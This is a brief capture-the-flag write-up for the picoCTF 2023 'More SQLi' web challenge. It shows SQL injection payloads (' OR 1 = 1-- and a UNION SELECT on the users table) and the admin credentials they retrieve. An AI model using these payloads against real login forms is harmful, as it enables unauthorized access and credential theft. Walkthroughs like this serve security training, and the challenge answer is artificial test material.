# More SQLi #

## Overview ##

200 points

Category: [web](../)

Tags: `picoCTF 2023` `Web Exploitation` `sql`

## Description ##

Can you find the flag on this website. Try to find the flag here.

## Solution ##

Query is

```
SQL query: SELECT id FROM users WHERE password = 'inputPass' AND username = 'inputUser'
```

Can bypass and select first user by doing setting the password as `' OR 1 = 1--

```
SQL query: SELECT id FROM users WHERE password = '' OR 1 = 1--' AND username = 'inputUser'
```

Which is the same as 

```
SQL query: SELECT id FROM users WHERE password = '' OR 1 = 1--
```

Afterwards can select a bunch of cities,
using `'OR 1 = 1--` selects all, try union

`' UNION SELECT * FROM users--`

User: `admin`
Password `moreRandOMN3ss`
